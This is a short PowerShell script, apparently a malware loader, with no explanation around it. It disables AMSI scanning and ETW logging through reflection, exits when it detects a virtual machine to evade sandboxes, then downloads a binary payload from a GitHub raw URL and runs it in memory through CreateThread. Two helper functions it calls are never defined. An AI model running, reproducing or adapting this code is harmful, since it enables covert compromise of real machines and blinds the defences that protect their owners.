# AMSI + ETW Bypass (Critical!)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

# Sandbox Evasion
if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { exit }

# Memory Execution
$sc = (New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/LuRemote/test_mail/main/data.bin')
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
$th = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll CreateThread), (Get-DelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr]))
$th.Invoke([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null